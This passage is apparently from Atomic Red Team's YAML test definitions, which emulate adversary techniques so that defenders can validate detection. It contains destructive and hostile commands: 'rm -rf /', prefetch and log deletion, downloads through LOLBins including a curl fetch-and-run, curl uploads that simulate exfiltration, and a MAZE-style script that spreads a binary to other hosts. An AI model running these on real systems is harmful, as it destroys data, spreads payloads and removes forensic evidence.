  auto_generated_guid: 9dee89bd-9a98-4c4f-9e2d-4256690b0e72
  description: |
    Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.
  supported_platforms:
  - windows
  input_arguments:
    file_to_delete:
      description: File to delete. Run the prereq command to create it if it does not exist.
      type: String
      default: $env:TEMP\deleteme_T1551.004
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The file to delete must exist on disk at specified location (#{file_to_delete})
    prereq_command: |
      if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Path #{file_to_delete} | Out-Null
  executor:
    command: |
      Remove-Item -path #{file_to_delete}
    name: powershell
- name: Delete an entire folder - Windows PowerShell
  auto_generated_guid: edd779e4-a509-4cba-8dfa-a112543dbfb1
  description: |
    Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.
  supported_platforms:
  - windows
  input_arguments:
    folder_to_delete:
      description: Folder to delete. Run the prereq command to create it if it does not exist.
      type: String
      default: $env:TEMP\deleteme_folder_T1551.004
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The folder to delete must exist on disk at specified location (#{folder_to_delete})
    prereq_command: |
      if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Path #{folder_to_delete} -Type Directory | Out-Null
  executor:
    command: |
      Remove-Item -Path #{folder_to_delete} -Recurse
    name: powershell
- name: Delete Filesystem - Linux
  auto_generated_guid: f3aa95fe-4f10-4485-ad26-abf22a764c52
  description: |
    This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.
  supported_platforms:
  - linux
  executor:
    command: |
      rm -rf / --no-preserve-root > /dev/null 2> /dev/null
    name: bash
- name: Delete Prefetch File
  auto_generated_guid: 36f96049-0ad7-4a5f-8418-460acaeb92fb
  description: |
    Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run "(Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" | Measure-Object).Count"
    before and after the test to verify that the number of prefetch files decreases by 1.
  supported_platforms:
  - windows
  executor:
    command: |
      Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
    name: powershell
    elevation_required: true
- name: Delete TeamViewer Log Files
  auto_generated_guid: 69f50a5f-967c-4327-a5bb-e1a9a9983785
  description: |
    Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.
    This test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer
    log file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.

    https://twitter.com/SBousseaden/status/1197524463304290305?s=20
  supported_platforms:
  - windows
  input_arguments:
    teamviewer_log_file:
      description: Teamviewer log file to create and delete.
      type: String
      default: $env:TEMP\TeamViewer_54.log
  executor:
    command: |
      New-Item -Path #{teamviewer_log_file} -Force | Out-Null
      Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore
    name: powershell




- name: Malicious User Agents - Powershell
  auto_generated_guid: 81c13829-f6c9-45b8-85a6-053366d55297
  description: |
    This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. 
    Use an application such as Wireshark to record the session and observe user agent strings and responses.

    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
  supported_platforms:
  - windows
  input_arguments:
    domain:
      description: Default domain to simulate against
      type: String
      default: www.google.com
  executor:
    command: |
      Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null
      Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
      Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
      Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
    name: powershell
- name: Malicious User Agents - CMD
  auto_generated_guid: dc3488b0-08c7-4fea-b585-905c83b48180
  description: |
    This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. 
    Use an application such as Wireshark to record the session and observe user agent strings and responses.

    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
  supported_platforms:
  - windows
  input_arguments:
    domain:
      description: Default domain to simulate against
      type: String
      default: www.google.com
    curl_path:
      description: path to curl.exe
      type: Path
      default: C:\Windows\System32\Curl.exe
  dependency_executor_name: powershell 
  dependencies: 
    - description: |
        Curl must be installed on system 
      prereq_command: |
        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        Invoke-WebRequest "https://curl.haxx.se/windows/dl-7.71.1/curl-7.71.1-win32-mingw.zip" -Outfile $env:temp\curl.zip
        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
        Copy-Item $env:temp\curl\curl-7.71.1-win32-mingw\bin\curl.exe #{curl_path}
        Remove-Item $env:temp\curl
        Remove-Item $env:temp\curl.zip
  executor:
    command: |
      #{curl_path} -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1
      #{curl_path} -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1
      #{curl_path} -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1
      #{curl_path} -s -A "*<|>*" -m3 #{domain} >nul 2>&1
    name: command_prompt
- name: Malicious User Agents - Nix
  auto_generated_guid: 2d7c471a-e887-4b78-b0dc-b0df1f2e0658
  description: |
    This test simulates an infected host beaconing to command and control.
    Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
  supported_platforms:
  - linux
  - macos
  input_arguments:
    domain:
      description: Default domain to simulate against
      type: String
      default: www.google.com
  executor:
    command: |
      curl -s -A "HttpBrowser/1.0" -m3 #{domain}
      curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
      curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
      curl -s -A "*<|>*" -m3 #{domain}
    name: sh



- name: rsync remote file copy (push)
  auto_generated_guid: 0fc6e977-cb12-44f6-b263-2824ba917409
  description: |
    Utilize rsync to perform a remote file copy (push)
  supported_platforms:
  - linux
  - macos
  input_arguments:
    remote_path:
      description: Remote path to receive rsync
      type: Path
      default: /tmp/victim-files
    remote_host:
      description: Remote host to copy toward
      type: String
      default: victim-host
    local_path:
      description: Path of folder to copy
      type: Path
      default: /tmp/adversary-rsync/
    username:
      description: User account to authenticate on remote host
      type: String
      default: victim
  executor:
    command: |
      rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
    name: bash
- name: rsync remote file copy (pull)
  auto_generated_guid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
  description: |
    Utilize rsync to perform a remote file copy (pull)
  supported_platforms:
  - linux
  - macos
  input_arguments:
    remote_path:
      description: Path of folder to copy
      type: Path
      default: /tmp/adversary-rsync/
    remote_host:
      description: Remote host to copy from
      type: String
      default: adversary-host
    local_path:
      description: Local path to receive rsync
      type: Path
      default: /tmp/victim-files
    username:
      description: User account to authenticate on remote host
      type: String
      default: adversary
  executor:
    command: |
      rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
    name: bash
- name: scp remote file copy (push)
  auto_generated_guid: 83a49600-222b-4866-80a0-37736ad29344
  description: |
    Utilize scp to perform a remote file copy (push)
  supported_platforms:
  - linux
  - macos
  input_arguments:
    remote_path:
      description: Remote path to receive scp
      type: Path
      default: /tmp/victim-files/
    local_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-scp
    remote_host:
      description: Remote host to copy toward
      type: String
      default: victim-host
    username:
      description: User account to authenticate on remote host
      type: String
      default: victim
  executor:
    command: |
      scp #{local_file} #{username}@#{remote_host}:#{remote_path}
    name: bash
- name: scp remote file copy (pull)
  auto_generated_guid: b9d22b9a-9778-4426-abf0-568ea64e9c33
  description: |
    Utilize scp to perform a remote file copy (pull)
  supported_platforms:
  - linux
  - macos
  input_arguments:
    remote_host:
      description: Remote host to copy from
      type: String
      default: adversary-host
    local_path:
      description: Local path to receive scp
      type: Path
      default: /tmp/victim-files/
    remote_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-scp
    username:
      description: User account to authenticate on remote host
      type: String
      default: adversary
  executor:
    command: |
      scp #{username}@#{remote_host}:#{remote_file} #{local_path}
    name: bash
- name: sftp remote file copy (push)
  auto_generated_guid: f564c297-7978-4aa9-b37a-d90477feea4e
  description: |
    Utilize sftp to perform a remote file copy (push)
  supported_platforms:
  - linux
  - macos
  input_arguments:
    remote_path:
      description: Remote path to receive sftp
      type: Path
      default: /tmp/victim-files/
    local_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-sftp
    remote_host:
      description: Remote host to copy toward
      type: String
      default: victim-host
    username:
      description: User account to authenticate on remote host
      type: String
      default: victim
  executor:
    command: |
      sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
    name: bash
- name: sftp remote file copy (pull)
  auto_generated_guid: 0139dba1-f391-405e-a4f5-f3989f2c88ef
  description: |
    Utilize sftp to perform a remote file copy (pull)
  supported_platforms:
  - linux
  - macos
  input_arguments:
    remote_host:
      description: Remote host to copy from
      type: String
      default: adversary-host
    local_path:
      description: Local path to receive sftp
      type: Path
      default: /tmp/victim-files/
    remote_file:
      description: Path of file to copy
      type: Path
      default: /tmp/adversary-sftp
    username:
      description: User account to authenticate on remote host
      type: String
      default: adversary
  executor:
    command: |
      sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
    name: bash
- name: certutil download (urlcache)
  auto_generated_guid: dd3b61dd-7bbc-48cd-ab51-49ad1a776df0
  description: |
    Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Local path to place file
      type: Path
      default: Atomic-license.txt
  executor:
    command: |
      cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
    cleanup_command: |
      del #{local_path} >nul 2>&1
    name: command_prompt
- name: certutil download (verifyctl)
  auto_generated_guid: ffd492e3-0455-4518-9fb1-46527c9f241b
  description: |
    Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Local path to place file
      type: Path
      default: Atomic-license.txt
  executor:
    command: |
      $datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
      New-Item -Path $datePath -ItemType Directory
      Set-Location $datePath
      certutil -verifyctl -split -f #{remote_file}
      Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
    cleanup_command: |
      Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore
    name: powershell
- name: Windows - BITSAdmin BITS Download
  auto_generated_guid: a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b
  description: |
    This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
    This technique is used by Qbot malware to download payloads.
  supported_platforms:
  - windows
  input_arguments:
    bits_job_name:
      description: Name of the created BITS job
      type: String
      default: qcxjb7
    local_path:
      description: Local path to place file
      type: Path
      default: '%temp%\Atomic-license.txt'
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
  executor:
    command: |
      C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
    name: command_prompt
- name: Windows - PowerShell Download
  auto_generated_guid: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8
  description: |
    This test uses PowerShell to download a payload.
    This technique is used by multiple adversaries and malware families.
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    destination_path:
      description: Destination path to file
      type: Path
      default: $env:TEMP\Atomic-license.txt
  executor:
    command: |
      (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}")
    cleanup_command: |
      Remove-Item #{destination_path} -Force -ErrorAction Ignore
    name: powershell
- name: OSTAP Worming Activity
  auto_generated_guid: 2ca61766-b456-4fcf-a35a-1233685e1cad
  description: |
    OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.
  supported_platforms:
  - windows
  input_arguments:
    destination_path:
      description: Path to create remote file at. Default is local admin share.
      type: String
      default: '\\localhost\C$'
  executor:
    command: |
      pushd #{destination_path}
      echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
      CScript.exe AtomicTestT1105.js //E:JScript
      del AtomicTestT1105.js /Q >nul 2>&1
      del AtomicTestFileT1105.js /Q >nul 2>&1
      popd
    name: command_prompt
    elevation_required: true
- name: svchost writing a file to a UNC path
  auto_generated_guid: fa5a2759-41d7-4e13-a19c-e8f28a53566f
  description: |
    svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
    Upon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\`, then execute svchost.exe with output to a txt file.
  supported_platforms:
  - windows
  executor:
    command: |
      copy C:\Windows\System32\cmd.exe C:\svchost.exe
      C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
    cleanup_command: |
      del C:\T1105.txt >nul 2>&1
      del C:\\svchost.exe >nul 2>&1
    name: command_prompt
    elevation_required: true
- name: Download a File with Windows Defender MpCmdRun.exe
  auto_generated_guid: 815bef8b-bf91-4b67-be4c-abe4c2a94ccc
  description: |
    Uses Windows Defender MpCmdRun.exe to download a file from the internet (must have version 4.18 installed).
    The input arguments "remote_file" and "local_path" can be used to specify the download URL and the name of the output file.
    By default, the test downloads the Atomic Red Team license file to the temp directory.

    More info and how to find your version can be found here https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: URL of file to download
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    local_path:
      description: Location to save downloaded file
      type: Path
      default: '%temp%\Atomic-license.txt'
  dependencies:
  - description: 'Must have a Windows Defender version with MpCmdRun.exe installed'
    prereq_command: |
      cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
      MpCmdRun.exe /?
    get_prereq_command: Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
  executor:
    command: |
      cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
      MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
    cleanup_command: |-
      del #{local_path} >nul 2>&1
      del %temp%\MpCmdRun.log >nul 2>&1
    name: command_prompt
- name: whois file download
  auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
  description: |
    Download a remote file using the whois utility
  supported_platforms:
  - linux
  - macos
  input_arguments:
    remote_host:
      description: Remote hostname or IP address
      type: String
      default: localhost
    remote_port:
      description: Remote port to connect to
      type: Integer
      default: 8443
    output_file:
      description: Path of file to save output to
      type: Path
      default: /tmp/T1105.whois.out
    query:
      description: Query to send to remote server
      type: String
      default: "Hello from Atomic Red Team test T1105"
    timeout:
      description: Timeout period before ending process (seconds)
      type: Integer
      default: 1
  dependencies:
    - description: |
        The whois and timeout commands must be present
      prereq_command: |
        which whois && which timeout
      get_prereq_command: |
        echo "Please install timeout and the whois package"
  executor:
    name: sh
    elevation_required: false
    command: |
      timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} "#{query}" > #{output_file}
    cleanup_command: |
      rm -f #{output_file}
- name: File Download via PowerShell
  auto_generated_guid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
  description: |
    Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.
  supported_platforms:
  - windows
  input_arguments:
    target_remote_file:
      description: File to download
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
    output_file:
      description: File to write to
      type: String
      default: LICENSE.txt
  executor:
    command: |
      (New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
    name: powershell
- name: File download with finger.exe on Windows
  auto_generated_guid: 5f507e45-8411-4f99-84e7-e38530c45d01
  description: |
    Simulate a file download using finger.exe. Connect to localhost by default, use custom input argument to test finger connecting to an external server.
    Because this is being tested on the localhost, you should not be expecting a successful connection
    https://www.exploit-db.com/exploits/48815
    https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/
  supported_platforms:
  - windows
  input_arguments:
    remote_host:
      description: Remote hostname or IP address
      type: String
      default: localhost
  executor:
    name: command_prompt
    command: |
      finger base64_filedata@#{remote_host}
- name: Download a file with IMEWDBLD.exe
  auto_generated_guid: 1a02df58-09af-4064-a765-0babe1a0d1e2
  description: |
    Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
    Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
    Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.
  supported_platforms:
  - windows
  input_arguments:
    remote_url:
      description: Location of file to be downloaded.
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
    file_name:
      description: Name of the file to be downloaded without extension.
      type: string
      default: T1105
  executor:
    command: |
      $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
      & $imewdbled #{remote_url}
    cleanup_command: |
      $inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\" 
      $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include #{file_name}* -Recurse -Force -File -ErrorAction SilentlyContinue)
      if("" -ne "$file_to_be_removed") { Remove-Item "$file_to_be_removed" -ErrorAction Ignore }
    name: powershell

- name: Curl Download File
  auto_generated_guid: 2b080b99-0deb-4d51-af0f-833d37c4ca6a
  description: |
    The following Atomic utilizes native curl.exe, or downloads it if not installed, to download a remote DLL and output to a number of directories to simulate malicious behavior.
    Expected output will include whether the file downloaded successfully or not.
  supported_platforms:
  - windows
  input_arguments:
    file_download:
      description: File to download
      type: String
      default: https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll
    curl_path:
      description: path to curl.exe
      type: Path
      default: C:\Windows\System32\Curl.exe
  dependency_executor_name: powershell 
  dependencies: 
    - description: |
        Curl must be installed on system.
      prereq_command: |
        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
        Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
        Remove-Item $env:temp\curl
        Remove-Item $env:temp\curl.zip
  executor:
    command: |
      #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
      #{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll
      #{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll
      #{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
    cleanup_command: |
      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
      del c:\users\public\music\allthethingsx64.dll >nul 2>&1
      del c:\programdata\allthethingsx64.dll >nul 2>&1
      del %Temp%\allthethingsx64.dll >nul 2>&1
    name: command_prompt

- name: Curl Upload File
  auto_generated_guid: 635c9a38-6cbf-47dc-8615-3810bc1167cf
  description: |
    The following Atomic utilizes native curl.exe, or downloads it if not installed, to upload a txt file to simulate data exfiltration
    Expected output will include whether the file uploaded successfully or not.
  supported_platforms:
  - windows
  input_arguments:
    curl_path:
      description: path to curl.exe
      type: Path
      default: C:\Windows\System32\Curl.exe
    remote_destination:
      description: Remote destination
      type: String
      default: www.example.com
    file_path:
      description: File to upload
      type: String
      default: c:\temp\atomictestfile.txt
  dependency_executor_name: powershell 
  dependencies: 
    - description: |
        Curl must be installed on system.
      prereq_command: |
        if (Test-Path #{curl_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        Invoke-WebRequest “https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip” -Outfile $env:temp\curl.zip
        Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
        Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
        Remove-Item $env:temp\curl
        Remove-Item $env:temp\curl.zip
    - description: |
        A file must be created to upload
      prereq_command: |
        if (Test-Path #{file_path}) {exit 0} else {exit 1}
      get_prereq_command: |
        echo "This is an Atomic Test File" > #{file_path}
  executor:
    command: |
      #{curl_path} -T #{file_path} #{remote_destination}
      #{curl_path} --upload-file #{file_path} #{remote_destination}
      #{curl_path} -d #{file_path} #{remote_destination}
      #{curl_path} --data #{file_path} #{remote_destination}
    name: command_prompt

- name: Download a file with Microsoft Connection Manager Auto-Download 
  auto_generated_guid: d239772b-88e2-4a2e-8473-897503401bcc
  description: |
    Uses the cmdl32 to download arbitrary file from the internet. The cmdl32 package is allowed to install the profile used to launch the VPN connection. However, the config is modified to download the arbitary file. 
    The issue of cmdl32.exe detecting and deleting the payload by identifying it as not a VPN Servers profile is avoided by setting a temporary TMP folder and denying the delete permission to all files for the user.
    Upon successful execution the test will open calculator and Notepad executable for 10 seconds.
    reference:
    https://twitter.com/ElliotKillick/status/1455897435063074824
    https://github.com/LOLBAS-Project/LOLBAS/pull/151
    https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/
    https://strontic.github.io/xcyclopedia/library/cmdl32.exe-FA1D5B8802FFF4A85B6F52A52C871BBB.html
  supported_platforms:
    - windows
  input_arguments:
    Path_to_file:
      description: Path to the Batch script
      type: Path
      default: PathToAtomicsFolder\T1105\src\T1105.bat
  executor:
    command: |
      #{Path_to_file} 1>NUL 
    cleanup_command: |
      del /f/s/q %temp%\T1105 >nul 2>&1
      rmdir /s/q %temp%\T1105 >nul 2>&1
    name: command_prompt

- name: MAZE Propagation Script
  auto_generated_guid: 70f4d07c-5c3e-4d53-bb0a-cdf3ada14baf
  description: |
    This test simulates MAZE ransomware's propogation script that searches through a list of computers, tests connectivity to them, and copies a binary file to the Windows\Temp directory of each one. 
    Upon successful execution, a specified binary file will attempt to be copied to each online machine, a list of the online machines, as well as a list of offline machines will be output to a specified location.
    Reference: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html 
  supported_platforms:
  - windows
  input_arguments:
    binary_file:
      description: Binary file to copy to remote machines
      type: string
      default: $env:comspec
    exe_remote_folder:
      description: Path to store executable on remote machine (no drive letter)
      type: String
      default: \Windows\Temp\T1105.exe
    remote_drive_letter:
      description: Remote drive letter
      type: String
      default: C
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Binary file must exist at specified location (#{binary_file})
    prereq_command: |
      if (Test-Path #{binary_file}) {exit 0} else {exit 1}
    get_prereq_command: |
      write-host "The binary_file input parameter must be set to a binary that exists on this computer."
  - description: |
      Machine list must exist at specified location ("$env:temp\T1105MachineList.txt")
    prereq_command: |
      if (Test-Path "$env:temp\T1105MachineList.txt") {exit 0} else {exit 1}
    get_prereq_command: |
      new-item -path "$env:temp\T1105MachineList.txt"
      echo "A machine list file has been generated at "$env:temp\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
  executor:
    command: |
      $machine_list = "$env:temp\T1105MachineList.txt"
      $offline_list = "$env:temp\T1105OfflineHosts.txt"
      $completed_list = "$env:temp\T1105CompletedHosts.txt"
      foreach ($machine in get-content -path "$machine_list")
      {if (test-connection -Count 1 -computername $machine -quiet) 
      {cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"
      echo $machine >> "$completed_list"
      wmic /node: "$machine" process call create "regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}"}
      else
      {echo $machine >> "$offline_list"}}
    cleanup_command: |
      if (test-path "$env:temp\T1105CompletedHosts.txt") 
      {foreach ($machine in get-content -path "$env:temp\T1105CompletedHosts.txt")
      {wmic /node: "$machine" process where name='"regsvr32.exe"' call terminate | out-null
      Remove-Item -path "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}" -force -erroraction silentlycontinue}}
      Remove-Item -path "$env:temp\T1105OfflineHosts.txt" -erroraction silentlycontinue
      Remove-item -path "$env:temp\T1105CompletedHosts.txt" -erroraction silentlycontinue
    name: powershell

- name: Printer Migration Command-Line Tool UNC share folder into a zip file
  auto_generated_guid: 49845fc1-7961-4590-a0f0-3dbcf065ae7e
  description: |
    Create a ZIP file from a folder in a remote drive
  supported_platforms:
    - windows
  input_arguments:
    Path_unc:
      description: Path to the UNC folder
      type: Path
      default: \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\
    Path_PrintBrm:
      description: Path to PrintBrm.exe
      type: Path
      default: C:\Windows\System32\spool\tools\PrintBrm.exe
  executor:
    command: |
      del %TEMP%\PrintBrm.zip >nul 2>&1 
      #{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
    cleanup_command: |
      del %TEMP%\PrintBrm.zip >nul 2>&1
    name: command_prompt

- name: Lolbas replace.exe use to copy file
  auto_generated_guid: 54782d65-12f0-47a5-b4c1-b70ee23de6df
  description: |
    Copy file.cab to destination
    Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/
  supported_platforms:
    - windows
  input_arguments:
    replace_cab:
      description: Path to the cab file
      type: Path
      default:  PathToAtomicsFolder\T1105\src\redcanary.cab
    Path_replace:
      description: Path to replace.exe
      type: Path
      default: C:\Windows\System32\replace.exe
  executor:
    command: |
      del %TEMP%\redcanary.cab >nul 2>&1
      #{Path_replace} #{replace_cab} %TEMP% /A
    cleanup_command: |
      del %TEMP%\redcanary.cab >nul 2>&1
    name: command_prompt

- name: Lolbas replace.exe use to copy UNC file
  auto_generated_guid: ed0335ac-0354-400c-8148-f6151d20035a
  description: |
    Copy UNC file to destination
    Reference: https://lolbas-project.github.io/lolbas/Binaries/Replace/
  supported_platforms:
    - windows
  input_arguments:
    replace_cab:
      description: UNC Path to the cab file
      type: Path
      default:  \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab
    Path_replace:
      description: Path to replace.exe
      type: Path
      default: C:\Windows\System32\replace.exe
  executor:
    command: |
      del %TEMP%\redcanary.cab >nul 2>&1
      #{Path_replace} #{replace_cab} %TEMP% /A
    cleanup_command: |
      del %TEMP%\redcanary.cab >nul 2>&1
    name: command_prompt

- name: certreq download
  auto_generated_guid: 6fdaae87-c05b-42f8-842e-991a74e8376b
  description: Use certreq to download a file from the web
  supported_platforms:
  - windows
  input_arguments:
    local_path:
      description: Local path to place file
      type: String
      default: '%temp%\Atomic-license.txt'
    remote_file:
      description: URL of file to copy
      type: url
      default: https://example.com
  executor:
    command: 'certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}'
    cleanup_command: 'del #{local_path} >nul 2>&1'
    name: command_prompt

- name: Download a file using wscript
  auto_generated_guid: 97116a3f-efac-4b26-8336-b9cb18c45188
  description: Use wscript to run a local VisualBasic file to download a remote file
  supported_platforms:
  - windows
  input_arguments:
    vbscript_file:
      description: Full path to the VisualBasic downloading the file
      type: String
      default: PathToAtomicsFolder\T1105\src\T1105-download-file.vbs
  executor:
    command: 'wscript.exe #{vbscript_file}'
    cleanup_command: del Atomic-License.txt >nul 2>&1
    name: command_prompt
- name: Linux Download File and Run
  auto_generated_guid: bdc373c5-e9cf-4563-8a7b-a9ba720a90f3
  description: |
    Utilize linux Curl to download a remote file, chmod +x it and run it.
  supported_platforms:
    - linux
  input_arguments:
    remote_url:
      description: url of remote payload
      type: string
      default:  https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/
    payload_name:
      description: payload name
      type: string
      default:  atomic.sh
  executor:
    command: |
      curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
    cleanup_command: |
      del #{payload_name}
    name: sh
- name: Nimgrab - Transfer Files
  auto_generated_guid: b1729c57-9384-4d1c-9b99-9b220afb384e
  description: |
    Use nimgrab.exe to download a file from the web. 
  supported_platforms:
  - windows
  input_arguments:
    remote_file:
      description: URL of file to copy
      type: Url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
    destination_path:
      description: Destination path to file
      type: Path
      default: $env:TEMP\Atomic-license.txt
    local_nimgrab:
      description: Local path to nimgrab
      type: Path
